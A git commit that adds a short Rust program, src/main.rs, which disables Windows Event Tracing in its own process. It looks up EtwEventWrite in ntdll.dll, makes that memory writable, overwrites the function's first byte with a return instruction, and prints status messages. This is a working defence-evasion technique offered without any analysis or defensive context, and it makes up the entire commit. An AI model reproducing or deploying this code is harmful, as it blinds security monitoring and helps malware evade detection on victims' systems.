8e69f67c77f167d6bf853c838ab33d4ea2edb843
leo78450 <harpiemangue37@gmail.com>
2024-02-01 15:01:33 +0100

    upload patch

---
+++ src/main.rs
@@ -0,0 +1,52 @@
+use std::os::raw::c_void;
+use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+use windows::Win32::System::LibraryLoader::GetModuleHandleA;
+use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
+use windows::Win32::System::Threading::GetCurrentProcess;
+use windows::{core::s, Win32::System::LibraryLoader::GetProcAddress};
+
+fn etw() {
+    println!("[+] Patching etw for current process...");
+
+    unsafe {
+        let patch = [0xc3];
+        let handle = GetModuleHandleA(s!("ntdll.dll")).unwrap();
+        let etw_addr = GetProcAddress(handle, s!("EtwEventWrite")).unwrap();
+        let mut old_permissions = PAGE_PROTECTION_FLAGS::default();
+
+        if VirtualProtect(
+            etw_addr as *mut c_void,
+            1,
+            PAGE_READWRITE,
+            &mut old_permissions,
+        ).is_err()
+        {
+            panic!("[-] Failed to change protection.");
+        }
+        if WriteProcessMemory(
+            GetCurrentProcess(),
+            etw_addr as *mut c_void,
+            patch.as_ptr().cast(),
+            1,
+            None,
+        ).is_err()
+        {
+            panic!("[-] Failed to overwrite function.");
+        }
+
+        if VirtualProtect(
+            etw_addr as *mut c_void,
+            1,
+            old_permissions,
+            &mut old_permissions,
+        ).is_err()
+        {
+            panic!("[-] Failed to restore permissions.");
+        }
+        println!("[+] ETW patched!");
+    }
+}
+
+fn main() {
+    etw();
+}
